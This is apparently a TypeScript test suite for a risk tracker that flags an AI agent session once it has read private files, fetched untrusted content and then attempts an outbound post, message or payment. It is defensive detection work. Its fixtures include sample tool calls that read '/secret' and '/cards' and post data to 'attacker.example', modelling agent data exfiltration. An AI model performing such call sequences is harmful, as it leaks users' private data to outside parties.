import { describe, it, expect } from "vitest";
import { TrifectaTracker } from "../../src/risk/trifecta.js";
import { classify } from "../../src/risk/classify.js";

describe("TrifectaTracker", () => {
  it("starts with all-false state", () => {
    const t = new TrifectaTracker();
    expect(t.state("s1")).toEqual({
      readPrivate: false,
      sawUntrusted: false,
      outboundAttempted: false,
    });
  });

  it("does NOT flag lethal on a single filesystem read", () => {
    const t = new TrifectaTracker();
    const c = classify({ name: "read_file", arguments: { path: "/x" } });
    const snap = t.inspect("s1", c);
    expect(snap.isLethal).toBe(false);
  });

  it("flags lethal on outbound after private read + untrusted read", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "read_file", arguments: { path: "/secret" } }));
    t.observe("s1", classify({ name: "fetch", arguments: { url: "https://evil.com" } }));
    const outboundCall = classify({
      name: "http_post",
      arguments: { url: "https://attacker.example", body: { x: 1 } },
    });
    const snap = t.inspect("s1", outboundCall);
    expect(snap.isLethal).toBe(true);
    expect(snap.reasons.length).toBeGreaterThan(0);
    expect(snap.reasons.some((r) => r.includes("outbound"))).toBe(true);
  });

  it("does NOT flag lethal when the outbound happens BEFORE a private read", () => {
    const t = new TrifectaTracker();
    // outbound first
    const snap1 = t.inspect("s1", classify({ name: "http_post", arguments: { url: "https://x" } }));
    expect(snap1.isLethal).toBe(false);
    t.observe("s1", classify({ name: "http_post", arguments: { url: "https://x" } }));
    // then private read — but no outbound now
    const snap2 = t.inspect("s1", classify({ name: "read_file", arguments: { path: "/x" } }));
    expect(snap2.isLethal).toBe(false);
  });

  it("flags lethal even if the outbound is a message send (not just network)", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "read_file", arguments: { path: "/private" } }));
    t.observe("s1", classify({ name: "fetch", arguments: { url: "https://news.example" } }));
    const snap = t.inspect("s1", classify({
      name: "slack_post_message",
      arguments: { channel: "#general", body: "leaked data" },
    }));
    expect(snap.isLethal).toBe(true);
  });

  it("treats a session as lethal on payment after private+untrusted", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "read_file", arguments: { path: "/cards" } }));
    t.observe("s1", classify({ name: "fetch", arguments: { url: "https://news.example" } }));
    const snap = t.inspect("s1", classify({
      name: "stripe_create_charge",
      arguments: { amount: 100, currency: "USD" },
    }));
    expect(snap.isLethal).toBe(true);
  });

  it("session ids are isolated", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "read_file", arguments: { path: "/x" } }));
    t.observe("s1", classify({ name: "fetch", arguments: { url: "https://e.com" } }));
    expect(t.state("s2")).toEqual({
      readPrivate: false,
      sawUntrusted: false,
      outboundAttempted: false,
    });
    const snap = t.inspect("s2", classify({ name: "http_post", arguments: { url: "https://x" } }));
    expect(snap.isLethal).toBe(false);
  });

  it("observe advances state monotonically", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "read_file", arguments: { path: "/a" } }));
    expect(t.state("s1").readPrivate).toBe(true);
    t.observe("s1", classify({ name: "fetch", arguments: { url: "https://x.example" } }));
    expect(t.state("s1").sawUntrusted).toBe(true);
    t.observe("s1", classify({ name: "http_post", arguments: { url: "https://x" } }));
    expect(t.state("s1").outboundAttempted).toBe(true);
  });

  it("reset clears a single session", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "read_file", arguments: { path: "/a" } }));
    t.reset("s1");
    expect(t.state("s1").readPrivate).toBe(false);
  });
});
